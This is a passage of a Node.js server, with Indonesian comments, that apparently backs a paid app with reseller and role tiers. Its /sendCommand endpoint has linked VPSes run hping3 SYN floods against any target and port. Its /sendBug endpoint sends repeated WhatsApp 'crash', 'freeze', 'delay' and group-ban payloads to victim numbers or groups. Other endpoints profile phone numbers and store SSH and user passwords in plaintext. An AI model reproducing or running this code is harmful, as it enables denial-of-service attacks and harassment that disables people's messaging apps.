  console.log("📥 VPS list loaded.");
  connectToAllVPS(); // Connect ke semua VPS saat server jalan
}

// Pantau perubahan file VPS
fs.watch(VPS_FILE, () => {
  try {
    vpsList = JSON.parse(fs.readFileSync(VPS_FILE, 'utf8'));
    console.log("🔄 VPS list updated.");
    connectToAllVPS(); // Connect ke semua VPS saat server jalan
  } catch (e) {
    console.error("❌ Failed to update VPS list:", e.message);
  }
});

// Middleware: Cek sessionKey dan ambil username
function getUserByKey(key) {
  const keyInfo = activeKeys[key];
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  return user ? keyInfo.username : null;
}

// GET /myServer
app.get("/myServer", (req, res) => {
  const key = req.query.key;
  const username = getUserByKey(key);
  if (!username) return res.status(401).json({ error: "Invalid session key" });

  const userVPS = vpsList.filter(vps => vps.owner === username);
  res.json(userVPS);
});

// POST /addServer
app.post("/addServer", (req, res) => {
  const { key, host, username: sshUser, password } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  if (!host || !sshUser || !password) return res.status(400).json({ error: "Missing fields" });

  const newVPS = { host, username: sshUser, password, owner };
  vpsList.push(newVPS);
  fs.writeFileSync(VPS_FILE, JSON.stringify(vpsList, null, 2));
  res.json({ success: true, message: "VPS added" });
});

// POST /delServer
app.post("/delServer", (req, res) => {
  const { key, host } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  const before = vpsList.length;
  vpsList = vpsList.filter(vps => !(vps.host === host && vps.owner === owner));
  fs.writeFileSync(VPS_FILE, JSON.stringify(vpsList, null, 2));

  const deleted = before !== vpsList.length;
  res.json({ success: deleted, message: deleted ? "VPS deleted" : "VPS not found" });
});

// POST /sendCommand
app.post("/sendCommand", (req, res) => {
  const { key, target, port, duration } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  if (!target || !port || !duration) return res.status(400).json({ error: "Missing fields" });

  const userVPS = vpsList.filter(vps => vps.owner === owner);
  if (userVPS.length === 0) return res.status(400).json({ error: "No VPS available for this user" });

  for (const vps of userVPS) {
    const conn = vpsConnections[vps.host];
    if (!conn) {
      console.log(`❌ Not connected to ${vps.host}`);
      continue;
    }

    const command = `screen -dmS hping3 -S --flood ${target} -p ${port}`;
    const killCmd = `sleep ${duration}; pkill screen`;

    conn.exec(`${command} && ${killCmd}`, (err, stream) => {
      if (err) return console.error(`❌ Exec error on ${vps.host}:`, err.message);
      stream.on('close', (code, signal) => {
        console.log(`✅ Command done on ${vps.host} (code: ${code})`);
      });
    });
  }

  res.json({ success: true, message: `Command sent to ${userVPS.length} VPS` });
});


function loadDatabase() {
  if (!fs.existsSync(DB_PATH)) {
    fs.writeFileSync(DB_PATH, JSON.stringify([]));
    console.log("[🗃️ DB] Database baru dibuat.");
  }
  const data = JSON.parse(fs.readFileSync(DB_PATH));
  return data;
}

function saveDatabase(data) {
  fs.writeFileSync(DB_PATH, JSON.stringify(data, null, 2));
}

function generateKey() {
  const key = crypto.randomBytes(8).toString("hex");
  console.log("[🔑 GEN] Key baru dibuat:", key);
  return key;
}

function isExpired(user) {
  const expired = new Date(user.expiredDate) < new Date();
  console.log(`[⏳ EXP] ${user.username} expired:`, expired);
  return expired;
}

app.get("/getInfo", async (req, res) => {
  const { key, number } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });

  const bizKeys = Object.keys(biz);
  if (!bizKeys.length) return res.json({ valid: false, message: "No connection" });

  const sock = biz[bizKeys[Math.floor(Math.random() * bizKeys.length)]];
  const jid = number.includes("@") ? number : number + "@s.whatsapp.net";

  try {
    const ppUrl = await sock.profilePictureUrl(jid, 'image').catch(() => null);
    const statusObj = await sock.fetchStatus(jid).catch(() => null);
    const check = await sock.onWhatsApp(number).catch(() => []);
    const info = check[0] || {};

    return res.json({
      valid: true,
      number: number,
      photo: ppUrl || "https://static.vecteezy.com/system/resources/previews/009/292/244/non_2x/default-avatar-icon-of-social-media-user-vector.jpg",
      bio: statusObj?.status || "No bio",
      online: !!statusObj?.lastSeen,
      type: info.biz ? "business" : "personal"
    });
  } catch (err) {
    console.warn("[❌ GETINFO ERROR]", err.message);
    return res.json({ valid: false, message: "Query failed" });
  }
});

const KEY_LIST_FILE = path.join(__dirname, 'keyList.json');

function loadKeyList() {
  try {
    return JSON.parse(fs.readFileSync(KEY_LIST_FILE, 'utf8'));
  } catch {
    return [];                // file belum ada / rusak → mulai kosong
  }
}

function saveKeyList(list) {
  fs.writeFileSync(KEY_LIST_FILE, JSON.stringify(list, null, 2));
}

function recordKey({ username, key, role, ip, androidId }) {
  const list = loadKeyList();
  const stamp = new Date().toISOString();
  const idx = list.findIndex(e => e.username === username);

  if (idx !== -1) {
    list[idx] = { username, lastLogin: stamp, sessionKey: key, ipAddress: ip, androidId };
  } else {
    list.push({ username, lastLogin: stamp, sessionKey: key, ipAddress: ip, androidId });
  }

  saveKeyList(list);
}

const news = [
  {
    image: "https://files.catbox.moe/mk89up.jpg",
    title: "Crylix Infinity",
    desc: "CREDIT BY Zasa "
  }
];

// ===== Endpoint: Ambil Riwayat Aktivitas User =====
app.get("/getMyActivity", (req, res) => {
  const { key } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false, message: "Invalid session key" });

  const username = keyInfo.username;
  const userLogPath = path.join(LOGS_DIR, `${username}.json`);

  try {
    if (!fs.existsSync(userLogPath)) {
      // Jika belum ada log sama sekali, return array kosong
      return res.json({ valid: true, activities: [] });
    }

    const logs = JSON.parse(fs.readFileSync(userLogPath, 'utf8'));

    // Urutkan dari yang terbaru
    logs.sort((a, b) => b.timestamp - a.timestamp);

    return res.json({ valid: true, activities: logs });
  } catch (err) {
    console.error("[GET LOGS ERROR]", err.message);
    return res.status(500).json({ valid: false, message: "Gagal mengambil log" });
  }
});

// ===== Endpoint: Validate & Login (With Device Lock) =====
app.post("/validate", (req, res) => {
  const { username, password, version, androidId } = req.body;

  if (!androidId) {
    return res.json({ valid: false, message: "androidId required" });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === username && u.password === password);

  if (!user) return res.json({ valid: false });

  if (isExpired(user)) {
    return res.json({ valid: true, expired: true });
  }

  // --- LOGIKA CEK PERANGKAT (DEVICE LOCK) ---
  const keyList = loadKeyList();
  const existingSession = keyList.find(e => e.username === username);

  // Jika user sudah punya session dan Device ID berbeda dengan yang login sekarang
  if (existingSession) {
    const oldAndroid = existingSession.androidId;
    const newAndroid = androidId;

    if (oldAndroid !== newAndroid) {
      console.log(`🚫 LOGIN DITOLAK: ${username} | Device Lama: ${oldAndroid} | Device Baru: ${newAndroid}`);

      // KIRIM PESAN ERROR KHUSUS SEHINGGA APLIKASI FLUTTER TAHU
      return res.json({
        valid: false,
        message: "Akun ini sedang login di perangkat lain. Silakan logout terlebih dahulu di perangkat lama."
      });
    }
  }
  // -------------------------------------------

  // Jika sampai sini, berarti:
  // 1. User belum pernah login (existingSession = null)
  // 2. ATAU Device ID sama (Refresh Key)

  const key = generateKey();
  activeKeys[key] = {
    username,
    created: Date.now(),
    expires: Date.now() + 10 * 60 * 1000,
  };

  recordKey({
    username,
    key,
    role: user.role || 'member',
    ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip,
    androidId,
  });

  saveUserLog(
    username,
    "login",
    "Login Berhasil",
    `IP: ${req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip} | Device: ${androidId}`
  );

  return res.json({
    valid: true,
    expired: false,
    key,
    expiredDate: user.expiredDate,
    role: user.role || "member",
    listBug: bugs,
    news
  });
});

app.get("/myInfo", (req, res) => {
  const { username, password, androidId, key } = req.query;
  console.log("[ℹ️ INFO] Fetching info for:", username);

  const db = loadDatabase();
  const user = db.find(u => u.username === username && u.password === password);
  const keyList = loadKeyList();
  const userKey = keyList.find(k => k.username === username);
  console.log(userKey)

  if (!userKey) {
    console.log("[❌ KEY] Invalid or missing session key.");
    return res.json({ valid: false, reason: "session" });
  }

  if (userKey.androidId !== androidId) {
    console.log("[⚠️ DEVICE] Device mismatch:", userKey.androidId, "!=", androidId);
    return res.json({ valid: false, reason: "device" });
  }

  if (!user) {
    console.log("[❌ INFO] User not found.");
    return res.json({ valid: false });
  }

  if (isExpired(user)) {
    console.log("[⚠️ INFO] User expired.");
    return res.json({ valid: true, expired: true });
  }

  recordKey({
    username,
    key,
    role: user.role || 'member',
    ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip,
    androidId
  });

  console.log("[✅ INFO] Info dikirim untuk:", username);

  return res.json({
    valid: true,
    expired: false,
    key,
    username: user.username,
    password: "******",
    expiredDate: user.expiredDate,
    role: user.role || "member",
    listBug: bugs,
    news: news // ✅ Tambahkan ini
  });
});

app.post("/changepass", (req, res) => {
  const { username, oldPass, newPass } = req.body;
  if (!username || !oldPass || !newPass) {
    return res.json({ success: false, message: "Incomplete data" });
  }

  const db = loadDatabase();
  const idx = db.findIndex(u => u.username === username && u.password === oldPass);
  if (idx === -1) {
    return res.json({ success: false, message: "Invalid credentials" });
  }

  db[idx].password = newPass;
  saveDatabase(db);

  return res.json({ success: true, message: "Password updated successfully" });
});

app.get("/sendBug", async (req, res) => {
  const { key, bug } = req.query;
  let { target } = req.query;

  console.log(`[📤 BUG] Send request for ${target} using key ${key} - Bug: ${bug}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ BUG] Key tidak valid.");
    return res.json({ valid: false });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) {
    console.log("[❌ BUG] User tidak ditemukan.");
    return res.json({ valid: false });
  }

  // ===== Role-based Cooldown =====
  const roleCooldowns = {
  member: 300,
  reseller: 240,
  vip: 60,
  admin: 30,
  partner: 30,
  moderator: 30,
  owner: 1,
  'high owner': 1,
  developer: 1,
};
  const role = user.role || "member";
  const cooldownSeconds = roleCooldowns[role] || 60;

  if (!user.lastSend) user.lastSend = 0;

  const now = Date.now();
  const diffSeconds = Math.floor((now - user.lastSend) / 1000);
  if (diffSeconds < cooldownSeconds) {
    console.log(`${user.username} Still Cooldown`)
    return res.json({
      valid: true,
      sended: false,
      cooldown: true,
      wait: cooldownSeconds - diffSeconds,
    });
  }

  // ============ Respon Duluan ============ //
  user.lastSend = now;
  saveDatabase(db);
  console.log(`${user.username} Trigger Cooldown`);

  res.json({
    valid: true,
    sended: true,
    cooldown: false,
    role
  });

  // ============ Kirim Bug di Background ============ //
  setImmediate(async () => {
    saveUserLog(
      user.username,
      "bug",
      `Kirim Bug: ${bug.toUpperCase()}`,
      `Target: ${target} | Role: ${user.role}`
    );

    const isMessBug = false;

    const attemptSend = async (sock, retry = false) => {
  try {
    let targetJid = "";
    const groupRegex = /chat\.whatsapp\.com\/([A-Za-z0-9]+)/;

    if (groupRegex.test(target)) {
      const inviteCode = target.match(groupRegex)[1];
      console.log(`[🚀] Mode Group. Invite Code: ${inviteCode}`);

      let groupInfo;
      try {
        groupInfo = await sock.groupGetInviteInfo(inviteCode);
      } catch (e) {
        throw new Error("Invite group invalid / expired");
      }

      targetJid = groupInfo.id;
      console.log(`[👥] Group JID: ${targetJid}`);

      try {
        await sock.groupAcceptInvite(inviteCode);
        console.log(`[✅] Join group success`);
      } catch (e) {
        console.log(`[⚠️] Already joined / join skipped`);
      }

    } else if (target.endsWith("@g.us")) {
      targetJid = target;
      console.log(`[👥] Target Group JID langsung`);

    } else {
      const cleanNumber = target.replace(/\D/g, "");
      targetJid = cleanNumber + "@s.whatsapp.net";
      console.log(`[📞] Mode Nomor: ${targetJid}`);
    }

    // --- KIRIM BUG (Switch Case) ---
    switch (bug) {
      case "delay":
        for (let i = 0; i < 150; i++) {
          await azkadelay(sock, targetJid);
          await sleep(2000);
        }
        break;
      case "okep":
        for (let i = 0; i < 15; i++) {
          await trybkpgb(sock, targetJid);
          await sleep(3000);
        }
        break;
        case "crash":
         for (let i = 0; i < 150; i++) {
           await newversionaether(sock, targetJid);
           await sleep(1500);
        }
        break;
        case "freeze":
         for (let i = 0; i < 150; i++) {
           await FreezeInvis(sock, targetJid);
           await sleep(2000);
        }
        break;
        case "bangb":
         for (let i = 0; i < 150; i++) {
           await BanGbNew(sock, targetJid);
           await sleep(1000);
        }
        break;
      default:
        console.log(`[⚠️] Bug '${bug}' tidak dikenali`);
    }

    console.log(`[✅ BUG] Bug '${bug}' terkirim ke ${targetJid}`);
    return true;

  } catch (err) {
    console.warn(`[⚠️ SEND ERROR] ${err.message}`);

    if (!retry) {
      if (user.role === 'vip') {
        const availableSocks = [];
        const vipPath = path.join(__dirname, 'vip');
        const userPath = path.join('permenmd', user.username);

        if (fs.existsSync(vipPath)) availableSocks.push(...getActiveSocketsFromPath(vipPath));
        if (fs.existsSync(userPath)) availableSocks.push(...getActiveSocketsFromPath(userPath));

        if (availableSocks.length > 0) {
          const retrySock = availableSocks[Math.floor(Math.random() * availableSocks.length)];
          return await attemptSend(retrySock, true);
        }
      } else {
        const retrySock = await checkActiveSessionInFolder(user.username);
        if (retrySock) return await attemptSend(retrySock, true);
      }
    }
    console.warn(`[❌ GAGAL] Kirim bug '${bug}' ke ${target}, ${err.message}`);
    return false;
  }
};

    // --- LOGIC PEMILIHAN SENDER (UPDATED) ---
let sock;
const senderMode = (req.query.senderMode || 'private').toLowerCase();
let availableSocks = [];
const baseDir = path.join(__dirname, 'permenmd');

// ⚠️ Validasi: user biasa gaboleh pake mode global
const userRole = (user.role || 'member').toLowerCase();
const GLOBAL_SENDER_ROLES = ['developer', 'high owner', 'owner', 'moderator', 'partner', 'admin'];
if (senderMode === 'global' && !GLOBAL_SENDER_ROLES.includes(userRole)) {
  console.warn(`[❌ SENDER] ${user.username} (${userRole}) coba akses global sender!`);
  return; // Bug udah dikirim responsnya di atas, jadi cukup stop di sini
}

if (senderMode === 'global') {
  // ══════ MODE GLOBAL: cari semua sender type=global dari semua user ══════
  if (fs.existsSync(baseDir)) {
    const allUsers = fs.readdirSync(baseDir).filter(p =>
      fs.lstatSync(path.join(baseDir, p)).isDirectory()
    );
    for (const u of allUsers) {
      const userFolder = path.join(baseDir, u);
      const files = fs.readdirSync(userFolder).filter(f => f.endsWith('.json') && f !== '_info.json');
      for (const f of files) {
        const sessionName = path.basename(f, '.json');
        if (!activeConnections[sessionName]) continue;
        const infoPath = path.join(userFolder, sessionName, '_info.json');
        if (fs.existsSync(infoPath)) {
          try {
            const info = JSON.parse(fs.readFileSync(infoPath, 'utf8'));
            // ✅ HANYA yang type = global
            if (info.type === 'global') {
              availableSocks.push(activeConnections[sessionName]);
            }
          } catch (_) {}
        }
      }
    }
  }
  console.log(`[🌍 GLOBAL] Ketemu ${availableSocks.length} sender global`);
} else {
  // ══════ MODE PRIVATE: cari sender MILIK USER INI dengan type=private ══════
  const userFolder = path.join(baseDir, user.username);
  if (fs.existsSync(userFolder)) {
    const files = fs.readdirSync(userFolder).filter(f => f.endsWith('.json') && f !== '_info.json');
    for (const f of files) {
      const sessionName = path.basename(f, '.json');
      if (!activeConnections[sessionName]) continue;
      const infoPath = path.join(userFolder, sessionName, '_info.json');
      let info = { owner: user.username, type: 'private' };
      if (fs.existsSync(infoPath)) {
        try { info = JSON.parse(fs.readFileSync(infoPath, 'utf8')); } catch (_) {}
      }
      // ✅ HANYA type=private DAN owner = user ini
      if (info.type === 'private' && info.owner === user.username) {
        availableSocks.push(activeConnections[sessionName]);
      }
    }
  }
  console.log(`[🔒 PRIVATE] Ketemu ${availableSocks.length} sender private milik ${user.username}`);
}

if (availableSocks.length === 0) {
  console.warn(`[❌ NO SOCK] Ga ada sender aktif untuk mode ${senderMode}`);
  return;
}

sock = availableSocks[Math.floor(Math.random() * availableSocks.length)];

    await attemptSend(sock);
  });
});

function getActiveCredsInFolder(subfolderName) {
  const folderPath = path.join('permenmd', subfolderName);

  // Cek jika folder tidak ada, return array kosong
  if (!fs.existsSync(folderPath)) return [];

  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  const activeCreds = [];

  for (const file of jsonFiles) {
    const sessionName = `${path.basename(file, ".json")}`;
    if (activeConnections[sessionName]) {
      activeCreds.push({
        sessionName: sessionName
      });
    }
  }

  return activeCreds;
}

// GET /getSenderStats
// Mengembalikan jumlah sender aktif untuk user sendiri (Private) dan total semua user (Global)
app.get("/getSenderStats", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ error: "Invalid session key" });

  const username = keyInfo.username;
  const baseDir = path.join(__dirname, 'permenmd');
  let privateCount = 0;
  let globalCount = 0;

  try {
    // ══════ 1. PRIVATE COUNT ══════
    // Hitung sender MILIK USER INI yang type = 'private'
    const userPath = path.join(baseDir, username);
    if (fs.existsSync(userPath)) {
      const files = fs.readdirSync(userPath).filter(f => f.endsWith(".json") && f !== "_info.json");
      files.forEach(f => {
        const sessionName = path.basename(f, ".json");
        if (!activeConnections[sessionName]) return;

        // ✅ CEK TYPE DARI _info.json
        const infoPath = path.join(userPath, sessionName, '_info.json');
        let info = { owner: username, type: 'private' };
        if (fs.existsSync(infoPath)) {
          try { info = JSON.parse(fs.readFileSync(infoPath, 'utf8')); } catch (_) {}
        }

        // Hanya hitung kalau type = private DAN owner = user ini
        if (info.type === 'private' && info.owner === username) {
          privateCount++;
        }
      });
    }

    // ══════ 2. GLOBAL COUNT ══════
    // Hitung SEMUA sender type = 'global' dari SEMUA user
    if (fs.existsSync(baseDir)) {
      const allUsers = fs.readdirSync(baseDir).filter(p =>
        fs.lstatSync(path.join(baseDir, p)).isDirectory()
      );

      allUsers.forEach(u => {
        const uPath = path.join(baseDir, u);
        if (!fs.existsSync(uPath)) return;

        const files = fs.readdirSync(uPath).filter(f => f.endsWith(".json") && f !== "_info.json");
        files.forEach(f => {
          const sessionName = path.basename(f, ".json");
          if (!activeConnections[sessionName]) return;

          const infoPath = path.join(uPath, sessionName, '_info.json');
          let info = { owner: u, type: 'private' };
          if (fs.existsSync(infoPath)) {
            try { info = JSON.parse(fs.readFileSync(infoPath, 'utf8')); } catch (_) {}
          }

          // Hanya hitung kalau type = global
          if (info.type === 'global') {
            globalCount++;
          }
        });
      });
    }

    res.json({
      valid: true,
      private: privateCount,
      global: globalCount
    });
  } catch (err) {
    console.error("[STATS ERROR]", err.message);
    res.status(500).json({ valid: false, error: "Server Error" });
  }
});

// GET /mySender (UPDATED - private + global)
app.get("/mySender", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ error: "Invalid session key" });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(401).json({ error: "User not found" });

  let conns = [];
  const baseDir = path.join(__dirname, 'permenmd');

  if (!fs.existsSync(baseDir)) return res.json({ valid: true, connections: [] });

  const allUsers = fs.readdirSync(baseDir).filter(p =>
    fs.lstatSync(path.join(baseDir, p)).isDirectory()
  );

  for (const u of allUsers) {
    const userFolder = path.join(baseDir, u);
    const files = fs.readdirSync(userFolder).filter(f => f.endsWith('.json') && f !== '_info.json');

    for (const f of files) {
      const sessionName = path.basename(f, '.json');
      if (!activeConnections[sessionName]) continue;

      const infoPath = path.join(userFolder, sessionName, '_info.json');
      let info = { owner: u, type: 'private' };
      if (fs.existsSync(infoPath)) {
        try { info = JSON.parse(fs.readFileSync(infoPath, 'utf8')); } catch (_) {}
      }

      // ══════ LOGIKA BARU ══════
      // 1. Kalau GLOBAL → tampilkan ke SEMUA user
      // 2. Kalau PRIVATE → hanya tampilkan kalau owner = user ini
      const isGlobal = (info.type === 'global');
      const isMyPrivate = (info.type === 'private' && info.owner === user.username);

      if (isGlobal || isMyPrivate) {
        conns.push({
          sessionName: sessionName,
          type: info.type || 'private',
          owner: info.owner || u,
          source: isGlobal ? 'global' : 'personal'
        });
      }
    }
  }

  // VIP pool tetap support (optional, kalau lu pake)
  if ((user.role || '').toLowerCase() === 'vip') {
    const vipPath = path.join(__dirname, 'vip');
    if (fs.existsSync(vipPath)) {
      const vipFolders = fs.readdirSync(vipPath).filter(f =>
        fs.statSync(path.join(vipPath, f)).isDirectory()
      );
      vipFolders.forEach(name => {
        if (activeConnections[name]) {
          conns.push({ sessionName: name, type: 'vip', owner: 'VIP_POOL', source: 'vip' });
        }
      });
    }
  }

  return res.json({ valid: true, connections: conns });
});

// DELETE /deleteSender (BARU)
app.delete("/deleteSender", (req, res) => {
  const { key, id } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ error: "Invalid session key" });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(401).json({ error: "User not found" });

  const baseDir = path.join(__dirname, 'permenmd');
  let found = false;

  if (fs.existsSync(baseDir)) {
    const allUsers = fs.readdirSync(baseDir).filter(p =>
      fs.lstatSync(path.join(baseDir, p)).isDirectory()
    );

    for (const u of allUsers) {
      const sessionPath = path.join(baseDir, u, id);
      if (!fs.existsSync(sessionPath)) continue;

      const infoPath = path.join(sessionPath, '_info.json');
      let info = { owner: u, type: 'private' };
      if (fs.existsSync(infoPath)) {
        try { info = JSON.parse(fs.readFileSync(infoPath, 'utf8')); } catch (_) {}
      }

      const isMine = (info.owner === user.username);
      const isDev = ['developer', 'high owner', 'owner'].includes((user.role || '').toLowerCase());

      if (!isMine && !isDev) {
        return res.json({ valid: false, message: "Ga bisa hapus sender orang lain." });
      }

      fs.rmSync(sessionPath, { recursive: true, force: true });
      if (activeConnections[id]) delete activeConnections[id];
      found = true;
      break;
    }
  }

  if (!found) return res.json({ valid: false, message: "Sender ga ketemu." });
  return res.json({ valid: true });
});


// 🔹 Endpoint getPairing
app.get("/getPairing", async (req, res) => {
  const { key, number } = req.query
  let { type } = req.query
  const keyInfo = activeKeys[key]
  if (!keyInfo) return res.json({ valid: false })

  const db = loadDatabase()
  const user = db.find(u => u.username === keyInfo.username)
  if (!user) return res.status(401).json({ error: "Invalid session key" })
  if (!number) return res.status(400).json({ error: "Number is required" })

  try {
    const baseDir = path.join("permenmd", user.username)
    const sessionDir = path.join(baseDir, number)

    if (fs.existsSync(sessionDir)) {
      fs.rmSync(sessionDir, { recursive: true, force: true })
    }

    if (!fs.existsSync(baseDir)) {
      fs.mkdirSync(baseDir, { recursive: true })
    }

    fs.mkdirSync(sessionDir, { recursive: true })

    const { state, saveCreds } = await useMultiFileAuthState(sessionDir)
    const { version } = await fetchLatestBaileysVersion()

    const sock = makeWASocket({
      keepAliveIntervalMs: 50000,
      logger: pino({ level: "silent" }),
      auth: state,
      syncFullHistory: true,
      markOnlineOnConnect: true,
      connectTimeoutMs: 60000,
      defaultQueryTimeoutMs: 0,
      generateHighQualityLinkPreview: true,
      browser: ["Ubuntu", "Chrome", "20.0.04"],
      version
    })

    sock.ev.on("creds.update", saveCreds)

    sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
      if (connection === "close") {
        const isLoggedOut =
          lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut
        if (!isLoggedOut) {
          await waiting(3000)
          await pairingWa(number, user.username)
        } else {
          delete activeConnections[number]
        }
      }
    })

    if (!sock.authState.creds.registered) {
  await waiting(1200)
  const code = await sock.requestPairingCode(number, "XXXXXXXX")
  if (code) {
  // 🔥 tulis _info.json dengan tipe yang diminta
  try {
    const senderType = (type || 'private').toLowerCase();
    fs.writeFileSync(
      path.join(sessionDir, '_info.json'),
      JSON.stringify({ owner: user.username, type: senderType })
    );
    console.log(`[INFO] _info.json ditulis: ${senderType} untuk ${number}`);
  } catch (e) {
    console.error('Gagal tulis _info.json:', e.message);
  }
  return res.json({ valid: true, number, pairingCode: code })
}
      return res.json({ valid: false })
    }

    return res.json({ valid: false })
  } catch (err) {
    return res.status(500).json({ error: err.message })
  }
})

// ===== Create Account =====
app.get("/createAccount", (req, res) => {
  const { key, newUser, pass, day } = req.query;
  console.log(`[👤 CREATE] Request create user '${newUser}' dengan key '${key}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ CREATE] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const creator = db.find(u => u.username === keyInfo.username);

  if (!creator || !["developer", "high owner", "owner", "moderator", "partner", "admin", "reseller"].includes(creator.role)) {
  console.log(`[❌ CREATE] ${creator?.username || "Unknown"} tidak memiliki izin.`);
  return res.json({ valid: true, authorized: false, message: "Not authorized." });
}

  // --- CEK LIMIT BULANAN ---
  const roleLimits = {
  developer: 999,
  'high owner': 999,
  owner: 50,
  moderator: 40,
  partner: 40,
  admin: 40,
  reseller: 30
};

  const currentLimit = roleLimits[creator.role];
  const currentMonth = new Date().toISOString().slice(0, 7); // Format "YYYY-MM"

  // Inisialisasi log penggunaan jika belum ada, atau reset jika bulan baru
  if (!creator.usageLog || creator.usageLog.month !== currentMonth) {
    creator.usageLog = { count: 0, month: currentMonth };
  }

  if (creator.usageLog.count >= currentLimit) {
    console.log(`[❌ CREATE] Limit akun bulan ${creator.role} (${currentLimit}) telah tercapai.`);
    return res.json({
      valid: true,
      created: false,
      limitReached: true,
      message: `Limit pembuatan akun bulan ini (${currentLimit}) telah tercapai.`
    });
  }

  // 🔐 Batasi maksimal 30 hari jika role adalah reseller
  if (creator.role === "reseller" && parseInt(day) > 30) {
    console.log("[❌ CREATE] Reseller tidak boleh membuat akun lebih dari 30 hari.");
    return res.json({ valid: true, created: false, invalidDay: true, message: "Reseller can only create accounts up to 30 days." });
  }

  if (db.find(u => u.username === newUser)) {
    console.log("[❌ CREATE] Username sudah digunakan.");
    return res.json({ valid: true, created: false, message: "Username already exists." });
  }

  const expired = new Date();
  expired.setDate(expired.getDate() + parseInt(day));

  const newAccount = {
    username: newUser,
    password: pass,
    expiredDate: expired.toISOString().split("T")[0],
    role: "member",
    uid: crypto.randomBytes(16).toString("hex"),
  };

  // ✅ TAMBAHKAN PENGGUNA KE DB
  db.push(newAccount);

  // ✅ TAMBAHKAN COUNTER LIMIT KEPADA CREATOR
  creator.usageLog.count++;

  saveDatabase(db);

  saveUserLog(
    creator.username,
    "create",
    "Buat Akun Member",
    `User: ${newUser} | Durasi: ${day} Hari`
  );

  console.log(`[✅ CREATE] Akun berhasil dibuat: ${newAccount} (Sisa Kuota: ${currentLimit - creator.usageLog.count})`);
  const logLine = `${creator.username} Created ${newUser} duration ${day}\n`;
  appendLogAsync('logUser.txt', logLine);

  return res.json({ valid: true, created: true, user: newAccount });
});

app.get("/deleteUser", (req, res) => {
  const { key, username } = req.query;
  console.log(`[🗑️ DELETE] Request hapus user '${username}' oleh key '${key}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ DELETE] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const deleter = db.find(u => u.username === keyInfo.username);
  const targetUser = db.find(u => u.username === username);

  if (!deleter || !targetUser) {
    return res.json({ valid: true, deleted: false, message: "User not found." });
  }

  // Tentukan Level Role
  const roleLevel = {
  developer: 8,
  'high owner': 7,
  owner: 6,
  moderator: 5,
  partner: 4,
  admin: 3,
  reseller: 2,
  vip: 1,
  member: 0
};

  const deleterLevel = roleLevel[deleter.role] || 0;
  const targetLevel = roleLevel[targetUser.role] || 0;

  // Logika: Hanya bisa hapus jika level deleter lebih tinggi dari target
  // Owner (6) bisa hapus Moderator (5), Partner (4), dst.
  // Moderator (5) bisa hapus Partner (4), Admin (3), dst.
  // Admin (3) bisa hapus Reseller (2), VIP (1), Member (0).
  
  if (deleterLevel <= targetLevel) {
    console.log(`[❌ DELETE] ${deleter.role} (Lv ${deleterLevel}) tidak boleh menghapus ${targetUser.role} (Lv ${targetLevel}).`);
    return res.json({ valid: true, authorized: false, message: "You cannot delete a user with equal or higher rank." });
  }

  // Lakukan penghapusan
  const index = db.findIndex(u => u.username === username);
  if (index !== -1) {
    const deletedUser = db[index];
    db.splice(index, 1);
    saveDatabase(db);

    // 👇 TAMBAHIN KODE INI DI SINI 👇
    sendTelegramNotif(
      `🗑️ *AKUN DIHAPUS (APP)*\n\n` +
      `━━━━━━━━━━━━━━━━━━━━\n` +
      `🆔 User: \`${username}\`\n` +
      `🎖️ Role: ${deletedUser.role || 'member'}\n` +
      `👑 Dihapus Oleh: ${deleter.username} (${deleter.role})\n` +
      `━━━━━━━━━━━━━━━━━━━━\n` +
      `🕒 Waktu: ${new Date().toLocaleString('id-ID')}`
    );

    const logLine = `${deleter.username} Deleted ${username}\n`;
    appendLogAsync('logUser.txt', logLine);
    
    console.log("[✅ DELETE] User berhasil dihapus:", deletedUser);
    return res.json({ valid: true, deleted: true, user: deletedUser });
  }

  return res.json({ valid: true, deleted: false, message: "Failed to delete user." });
});

app.get('/ping', (req, res) => {
  res.send('pong');
});

app.get("/listUsers", (req, res) => {
  const { key } = req.query;
  console.log(`[📋 LIST] Request lihat semua user oleh key '${key}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ LIST] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const requester = db.find(u => u.username === keyInfo.username);

  // Izinkan Developer, All Access, dan Owner melihat list
  if (!requester || !["developer", "high owner", "owner", "moderator", "partner", "admin"].includes(requester.role)) {
    console.log(`[❌ LIST] ${requester?.username || "Unknown"} tidak memiliki izin melihat list.`);
    return res.json({ valid: true, authorized: false, message: "Access denied." });
  }

  const users = db.map(u => ({
    username: u.username,
    expiredDate: u.expiredDate,
    role: u.role || "member",
    parent: u.parent || "SYSTEM" // Tambahkan parent jika perlu untuk tracking
  }));

